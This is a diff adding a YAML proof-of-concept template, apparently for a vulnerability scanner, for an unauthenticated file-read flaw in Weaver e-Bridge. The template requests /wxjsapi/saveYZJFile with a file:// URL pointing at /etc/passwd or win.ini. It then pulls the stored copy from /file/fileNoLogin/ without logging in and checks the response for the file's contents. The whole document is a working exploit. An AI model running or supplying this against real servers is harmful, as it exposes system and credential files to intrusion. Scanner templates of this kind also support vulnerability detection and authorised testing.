@@ -1,0 +1,44 @@
+name: poc-yaml-weaver-ebridge-file-read
+manual: true
+transport: http
+rules:
+    linux0:
+        request:
+            cache: true
+            method: GET
+            path: /wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt
+            follow_redirects: false
+        expression: response.status == 200 && response.content_type.contains("json") && response.body.bcontains(b"id")
+        output:
+            search: '"\\\"id\\\"\\:\\\"(?P<var>.+?)\\\"\\,".bsubmatch(response.body)'
+            var: search["var"]
+    linux1:
+        request:
+            cache: true
+            method: GET
+            path: /file/fileNoLogin/{{var}}
+            follow_redirects: false
+        expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    windows0:
+        request:
+            cache: true
+            method: GET
+            path: /wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///c://windows/win.ini&fileExt=txt
+            follow_redirects: false
+        expression: response.status == 200 && response.content_type.contains("json") && response.body.bcontains(b"id")
+        output:
+            search: '"\\\"id\\\"\\:\\\"(?P<var>.+?)\\\"\\,".bsubmatch(response.body)'
+            var: search["var"]
+    windows1:
+        request:
+            cache: true
+            method: GET
+            path: /file/fileNoLogin/{{var}}
+            follow_redirects: false
+        expression: response.status == 200 && (response.body.bcontains(b"for 16-bit app support") || response.body.bcontains(b"[extensions]"))
+expression: linux0() && linux1() || windows0() && windows1()
+detail:
+    author: mvhz81
+    links:
+        - https://mrxn.net/Infiltration/323.html
+    info: e-bridge-file-read for Linux
